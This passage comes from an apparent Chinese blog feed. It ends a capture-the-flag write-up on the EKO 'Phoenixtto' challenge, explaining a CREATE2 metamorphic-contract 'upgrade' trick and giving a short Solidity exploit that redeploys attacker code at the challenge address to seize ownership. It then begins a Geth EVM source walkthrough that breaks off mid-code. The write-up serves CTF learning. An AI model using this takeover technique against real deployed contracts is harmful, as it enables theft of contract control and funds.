将始终将字节码部署到相同的地址。需要注意的一件重要事情是，使用的字节码是参数的一部分，也是用于生成地址的公式的一部分。因此，如果它发生变化，结果地址将因此发生变化。</p><p>所有的magic都是由部署的字节码中的内容完成的（始终相同）<code>5860208158601c335a63aaf10f428752fa158151803b80938091923cf3</code>：. 只需几句话，它就会查询调用者，询问哪个是执行合约的地址，用作要部署的智能合约的源。</p><p>通过这样做，虽然部署的合约是动态的，但生成的地址始终是相同的。</p><p>而这里create2其实是使用的getImplementation的creationcode来部署的合约。应用此方法，Create2可以将不同的代码部署在一个地址上，从而实现“升级”。前提是旧合约必须被自毁，这样Create2再次在这个合约地址部署合约的时候才不会报错。</p><p>分析到这里，解题思路已经很清晰了，就是利用这个“升级”漏洞，把该地址变为我们自己的攻击合约。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"../ChallengePhoenixtto.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract ChallengePhoenixttoReborn &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reBorn</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        owner = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ChallengePhoenixttoDeployer &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(address laboratory) &#123;</span><br><span class="line">        Laboratory(laboratory).reBorn(type(ChallengePhoenixttoReborn).creationCode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> EKO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EKO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EVM源码分析（三）</title>
      <link href="/code-analysis3/"/>
      <url>/code-analysis3/</url>
      
        <content type="html"><![CDATA[<h1 id="EVM源码分析（二）"><a href="#EVM源码分析（二）" class="headerlink" title="EVM源码分析（二）"></a>EVM源码分析（二）</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>上一章我们分析了Geth客户端接收到交易后处理的一系列过程，接着上一章的TransitionDB函数讲，从这里开始将进入到EVM处理。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// core/state_transation.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// TransitionDB 函数通过 apply message 将会改变state 并且返回 包含gas使用情况的结果。</span></span><br><span class="line"><span class="comment">// 如果执行失败，将会返回一个error, 这个error代表一个共识错误。</span></span><br><span class="line">func (st *StateTransition) TransitionDb() (ret []byte, usedGas uint64, failed bool, err error) &#123;</span><br><span class="line">    <span class="comment">//进行最初的检查，</span></span><br><span class="line">   <span class="keyword">if</span> err = st.preCheck(); err != nil &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   msg := st.msg</span><br><span class="line">   sender := vm.AccountRef(msg.From())</span><br><span class="line">   homestead := st.evm.ChainConfig().IsHomestead(st.evm.BlockNumber)</span><br><span class="line">   contractCreation := msg.To() == nil</span><br><span class="line"></span><br><span class="line">   gas, <span class="attr">err</span> := IntrinsicGas(st.data, contractCreation, homestead)</span><br><span class="line">   <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">      <span class="keyword">return</span> nil, <span class="number">0</span>, <span class="literal">false</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> err = st.useGas(gas); err != nil &#123;</span><br><span class="line">      <span class="keyword">return</span> nil, <span class="number">0</span>, <span class="literal">false</span>, err</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> (</span><br><span class="line">      evm = st.evm</span><br><span class="line">      vmerr error</span><br><span class="line">   )</span><br><span class="line">   <span class="keyword">if</span> contractCreation &#123;</span><br><span class="line">      ret, _, st.gas, vmerr = evm.Create(sender, st.data, st.gas, st.value)</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      st.state.SetNonce(msg.From(), st.state.GetNonce(sender.Address())+<span class="number">1</span>)</span><br><span class="line">      ret, st.gas, vmerr = evm.Call(sender, st.to(), st.data, st.gas, st.value)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> vmerr != nil &#123;</span><br><span class="line">      log.Debug(<span class="string">"VM returned with error"</span>, <span class="string">"err"</span>, vmerr)</span><br><span class="line">      <span class="keyword">if</span> vmerr == vm.ErrInsufficientBalance &#123;</span><br><span class="line">         <span class="keyword">return</span> nil, <span class="number">0</span>, <span class="literal">false</span>, vmerr</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   st.refundGas()</span><br><span class="line">   st.state.AddBalance(st.evm.Coinbase, <span class="keyword">new</span>(big.Int).Mul(<span class="keyword">new</span>(big.Int).SetUint64(st.gasUsed()), st.gasPrice))</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> ret, st.gasUsed(), vmerr != nil, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从以上代码其实可以看出当以太坊的交易中to地址为nil时， 意味着部署合约， 那么就会调用evm.Create方法。 否则调用了evm.Call方法。 也就是说分析以太坊虚拟机源码时， 只要从这两个函数作为入口即可。</p><p>首先我们先看一下EVM数据结构:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> EVM <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="comment">// Context provides auxiliary blockchain related information</span></span><br><span class="line">    Context</span><br><span class="line">    <span class="comment">// StateDB是状态存储接口。 这个接口非常重要。 可以肯定的说一直evm中的大部分工作都是围绕这次接口进行的。</span></span><br><span class="line">    StateDB StateDB</span><br><span class="line">    <span class="comment">// 记录当前调用的深度</span></span><br><span class="line">    depth <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录链的配置 主要是以太坊经理过几次分叉和提案 为了兼容之前的区块信息</span></span><br><span class="line">    <span class="comment">// 所以做了一些兼容 移植的时候我们只考虑最新版本的内容</span></span><br><span class="line">    chainConfig *params.ChainConfig</span><br><span class="line">    <span class="comment">// 这个参数 对我们移植过程中的意义不是很大</span></span><br><span class="line">    chainRules params.Rules</span><br><span class="line">    <span class="comment">// 这个是虚拟机的一些配置参数 是创建解释器的初始化参数 比如所有操作码对应的函数也是在此处配置的</span></span><br><span class="line">    vmConfig Config</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 解释器对象 它是整个进行虚拟机代码执行的地方。</span></span><br><span class="line">    interpreter *Interpreter</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用来终止代码执行</span></span><br><span class="line">    abort <span class="keyword">int32</span></span><br><span class="line">    <span class="comment">// callGasTemp holds the gas available for the current call. This is needed because the</span></span><br><span class="line">    <span class="comment">// available gas is calculated in gasCall* according to the 63/64 rule and later</span></span><br><span class="line">    <span class="comment">// applied in opCall*.</span></span><br><span class="line">    callGasTemp <span class="keyword">uint64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看一看创建EVM的方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewEVM</span><span class="params">(ctx Context, statedb StateDB, chainConfig *params.ChainConfig, vmConfig Config)</span> *<span class="title">EVM</span></span> &#123;</span><br><span class="line">    evm := &amp;EVM&#123;</span><br><span class="line">        Context:     ctx,</span><br><span class="line">        StateDB:     statedb,</span><br><span class="line">        vmConfig:    vmConfig,</span><br><span class="line">        chainConfig: chainConfig,</span><br><span class="line">        chainRules:  chainConfig.Rules(ctx.BlockNumber),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主要看这个地方 创建解释器 解释器是执行字节码的关键</span></span><br><span class="line">    evm.interpreter = NewInterpreter(evm, vmConfig)</span><br><span class="line">    <span class="keyword">return</span> evm</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewInterpreter</span><span class="params">(evm *EVM, cfg Config)</span> *<span class="title">Interpreter</span></span> &#123;</span><br><span class="line">  <span class="comment">// 在这里设置 操作码对应的函数 </span></span><br><span class="line">  <span class="comment">// 主要原因是以太坊经历版本迭代之后 操作码有了一些变化</span></span><br><span class="line">  <span class="comment">// 我们移植的时候 这个地方只会保留最新版本的操作码表</span></span><br><span class="line">    <span class="keyword">if</span> !cfg.JumpTable[STOP].valid &#123;</span><br><span class="line">        <span class="keyword">switch</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> evm.ChainConfig().IsConstantinople(evm.BlockNumber):</span><br><span class="line">            cfg.JumpTable = constantinopleInstructionSet</span><br><span class="line">        <span class="keyword">case</span> evm.ChainConfig().IsByzantium(evm.BlockNumber):</span><br><span class="line">            cfg.JumpTable = byzantiumInstructionSet</span><br><span class="line">        <span class="keyword">case</span> evm.ChainConfig().IsHomestead(evm.BlockNumber):</span><br><span class="line">            cfg.JumpTable = homesteadInstructionSet</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            cfg.JumpTable = frontierInstructionSet</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &amp;Interpreter&#123;</span><br><span class="line">        evm:      evm,</span><br><span class="line">        cfg:      cfg,</span><br><span class="line">        <span class="comment">// gas表中记录了对应的执行操作需要花费的gas 移植的时候我们只保留一个</span></span><br><span class="line">        gasTable: evm.ChainConfig().GasTable(evm.BlockNumber),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们先分析部署合约的入口， 看一看整个合约部署的流程。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create creates a new contract using code as deployment code.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(evm *EVM)</span> <span class="title">Create</span><span class="params">(caller ContractRef, code []<span class="keyword">byte</span>, gas <span class="keyword">uint64</span>, value *big.Int)</span> <span class="params">(ret []<span class="keyword">byte</span>, contractAddr common.Address, leftOverGas <span class="keyword">uint64</span>, err error)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 首先检测当前evm执行的深度 默认不应该超过1024  </span></span><br><span class="line">    <span class="keyword">if</span> evm.depth &gt; <span class="keyword">int</span>(params.CallCreateDepth) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, common.Address&#123;&#125;, gas, ErrDepth</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这个函数我们不在追踪 其功能就是检测是否调用方的金额大约value</span></span><br><span class="line">    <span class="keyword">if</span> !evm.CanTransfer(evm.StateDB, caller.Address(), value) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, common.Address&#123;&#125;, gas, ErrInsufficientBalance</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 首先获取调用者的nonce 然后再更新调用者的nonce  这个如果熟悉以太坊交易流程的话应该知道nonce的作用。</span></span><br><span class="line">    nonce := evm.StateDB.GetNonce(caller.Address())</span><br><span class="line">    evm.StateDB.SetNonce(caller.Address(), nonce+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 下面这三句就是根据调用者地址 调用者nonce创建合约账户地址 并且判断是否这个合约地址确实没有部署过合约</span></span><br><span class="line">    contractAddr = crypto.CreateAddress(caller.Address(), nonce)</span><br><span class="line">    contractHash := evm.StateDB.GetCodeHash(contractAddr)</span><br><span class="line">    <span class="keyword">if</span> evm.StateDB.GetNonce(contractAddr) != <span class="number">0</span> || (contractHash != (common.Hash&#123;&#125;) &amp;&amp; contractHash != emptyCodeHash) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, common.Address&#123;&#125;, <span class="number">0</span>, ErrContractAddressCollision</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 既然已经创建好了合约地址 那么就要为这个合约地址创建账户体系</span></span><br><span class="line">    snapshot := evm.StateDB.Snapshot()</span><br><span class="line">    <span class="comment">// 所以下面这个函数在一直的时候我们的工作内容之一</span></span><br><span class="line">    evm.StateDB.CreateAccount(contractAddr)</span><br><span class="line">    <span class="keyword">if</span> evm.ChainConfig().IsEIP158(evm.BlockNumber) &#123;</span><br><span class="line">        evm.StateDB.SetNonce(contractAddr, <span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    evm.Transfer(evm.StateDB, caller.Address(), contractAddr, value)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建一个合约对象 设置合约对象的参数 比如调用者 合约代码 合约hash的内容 </span></span><br><span class="line">    contract := NewContract(caller, AccountRef(contractAddr), value, gas)</span><br><span class="line">    contract.SetCallCode(&amp;contractAddr, crypto.Keccak256Hash(code), code)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> evm.vmConfig.NoRecursion &amp;&amp; evm.depth &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, contractAddr, gas, <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> evm.vmConfig.Debug &amp;&amp; evm.depth == <span class="number">0</span> &#123;</span><br><span class="line">        evm.vmConfig.Tracer.CaptureStart(caller.Address(), contractAddr, <span class="literal">true</span>, code, gas, value)</span><br><span class="line">    &#125;</span><br><span class="line">    start := time.Now()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将evm对象 合约对象传入run函数开始执行 此函数是核心 等一会分析到Call入口的时候最终也会调用此函数</span></span><br><span class="line">    ret, err = run(evm, contract, <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 上述函数执行完成后返回的就是我前一章所说的初始化后的合约代码</span></span><br><span class="line">  <span class="comment">// 也就是我们在remix上看到runtime的字节码 以后调用合约代码其实质就是</span></span><br><span class="line">  <span class="comment">// 执行返回后的代码</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 下面的流程主要是一些检查 把返回的字节码保存到此合约账户名下 这样以后调用合约代码才能加载成功</span></span><br><span class="line">    maxCodeSizeExceeded := evm.ChainConfig().IsEIP158(evm.BlockNumber) &amp;&amp; <span class="built_in">len</span>(ret) &gt; params.MaxCodeSize</span><br><span class="line">    <span class="comment">// if the contract creation ran successfully and no errors were returned</span></span><br><span class="line">    <span class="comment">// calculate the gas required to store the code. If the code could not</span></span><br><span class="line">    <span class="comment">// be stored due to not enough gas set an error and let it be handled</span></span><br><span class="line">    <span class="comment">// by the error checking condition below.</span></span><br><span class="line">    <span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; !maxCodeSizeExceeded &#123;</span><br><span class="line">        createDataGas := <span class="keyword">uint64</span>(<span class="built_in">len</span>(ret)) * params.CreateDataGas</span><br><span class="line">        <span class="keyword">if</span> contract.UseGas(createDataGas) &#123;</span><br><span class="line">            evm.StateDB.SetCode(contractAddr, ret)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            err = ErrCodeStoreOutOfGas</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// When an error was returned by the EVM or when setting the creation code</span></span><br><span class="line">    <span class="comment">// above we revert to the snapshot and consume any gas remaining. Additionally</span></span><br><span class="line">    <span class="comment">// when we're in homestead this also counts for code storage gas errors.</span></span><br><span class="line">    <span class="keyword">if</span> maxCodeSizeExceeded || (err != <span class="literal">nil</span> &amp;&amp; (evm.ChainConfig().IsHomestead(evm.BlockNumber) || err != ErrCodeStoreOutOfGas)) &#123;</span><br><span class="line">        evm.StateDB.RevertToSnapshot(snapshot)</span><br><span class="line">        <span class="keyword">if</span> err != errExecutionReverted &#123;</span><br><span class="line">            contract.UseGas(contract.Gas)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Assign err if contract code size exceeds the max while the err is still empty.</span></span><br><span class="line">    <span class="keyword">if</span> maxCodeSizeExceeded &amp;&amp; err == <span class="literal">nil</span> &#123;</span><br><span class="line">        err = errMaxCodeSizeExceeded</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> evm.vmConfig.Debug &amp;&amp; evm.depth == <span class="number">0</span> &#123;</span><br><span class="line">        evm.vmConfig.Tracer.CaptureEnd(ret, gas-contract.Gas, time.Since(start), err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret, contractAddr, contract.Gas, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们下面就开始主要分析run函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">run</span><span class="params">(evm *EVM, contract *Contract, input []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> contract.CodeAddr != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="comment">// 首先会进入下面这个代码执行  它会根据给定的合约地址来判断是否是以太坊内部已经保存的合约</span></span><br><span class="line">      <span class="comment">// 如果是创建新合约 肯定不是内置合约</span></span><br><span class="line">        precompiles := PrecompiledContractsHomestead</span><br><span class="line">        <span class="keyword">if</span> evm.ChainConfig().IsByzantium(evm.BlockNumber) &#123;</span><br><span class="line">            precompiles = PrecompiledContractsByzantium</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> p := precompiles[*contract.CodeAddr]; p != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> RunPrecompiledContract(p, input, contract)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 所以最后我们最终到这里 此时input参数为nil</span></span><br><span class="line">    <span class="keyword">return</span> evm.interpreter.Run(contract, input)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解释器的Run函数才是真正执行合约代码的地方</span></span><br><span class="line"><span class="comment">// 为了凸显主流程 我们隐藏部分内容</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(in *Interpreter)</span> <span class="title">Run</span><span class="params">(contract *Contract, input []<span class="keyword">byte</span>)</span> <span class="params">(ret []<span class="keyword">byte</span>, err error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> in.intPool == <span class="literal">nil</span> &#123;</span><br><span class="line">        in.intPool = poolOfIntPools.get()</span><br><span class="line">        <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            poolOfIntPools.put(in.intPool)</span><br><span class="line">            in.intPool = <span class="literal">nil</span></span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面这些变量应该说满足了一个字节码执行的所有条件</span></span><br><span class="line">    <span class="comment">// 有操作码 内存 栈 PC计数器 </span></span><br><span class="line">    <span class="comment">// 强烈建议使用debug工具去跟踪一遍执行的流程 </span></span><br><span class="line">    <span class="comment">// 其实它的执行流程就和上一章我们人肉执行的流程一样</span></span><br><span class="line">    <span class="keyword">var</span> (</span><br><span class="line">        op    OpCode        <span class="comment">// current opcode</span></span><br><span class="line">        mem   = NewMemory() <span class="comment">// bound memory</span></span><br><span class="line">        stack = newstack()  <span class="comment">// local stack</span></span><br><span class="line">        pc   = <span class="keyword">uint64</span>(<span class="number">0</span>) <span class="comment">// program counter</span></span><br><span class="line">        cost <span class="keyword">uint64</span></span><br><span class="line">        pcCopy  <span class="keyword">uint64</span> <span class="comment">// needed for the deferred Tracer</span></span><br><span class="line">        gasCopy <span class="keyword">uint64</span> <span class="comment">// for Tracer to log gas remaining before execution</span></span><br><span class="line">        logged  <span class="keyword">bool</span>   <span class="comment">// deferred Tracer should ignore already logged steps</span></span><br><span class="line">    )</span><br><span class="line">    contract.Input = input</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Reclaim the stack as an int pool when the execution stops</span></span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; in.intPool.put(stack.data...) &#125;()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 开始循环PC计数执行 直到有中止执行或者跳出循环</span></span><br><span class="line">    <span class="keyword">for</span> atomic.LoadInt32(&amp;in.evm.abort) == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="comment">// 根据PC计数器获取操作码</span></span><br><span class="line">        op = contract.GetOp(pc)</span><br><span class="line">        <span class="comment">// 根据操作码获取对应的操作函数</span></span><br><span class="line">        operation := in.cfg.JumpTable[op]</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证栈中的数据是否符合操作码需要的数据</span></span><br><span class="line">        <span class="keyword">if</span> err := operation.validateStack(stack); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// If the operation is valid, enforce and write restrictions</span></span><br><span class="line">        <span class="keyword">if</span> err := in.enforceRestrictions(op, operation, stack); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> memorySize <span class="keyword">uint64</span></span><br><span class="line">        <span class="comment">// 有些指令是需要额外的内存消耗 在jump_table.go文件中可以看到他们具体每个操作码的对应的额外内存消耗计算</span></span><br><span class="line">        <span class="comment">// 并不是所有的指令都需要计算消耗的内存 </span></span><br><span class="line">        <span class="comment">// memorySize指向对应的计算消耗内存的函数 根据消耗的内存来计算消费的gas</span></span><br><span class="line">        <span class="keyword">if</span> operation.memorySize != <span class="literal">nil</span> &#123;</span><br><span class="line">            memSize, overflow := bigUint64(operation.memorySize(stack))</span><br><span class="line">            <span class="keyword">if</span> overflow &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">nil</span>, errGasUintOverflow</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> memorySize, overflow = math.SafeMul(toWordSize(memSize), <span class="number">32</span>); overflow &#123;</span><br><span class="line">                <span 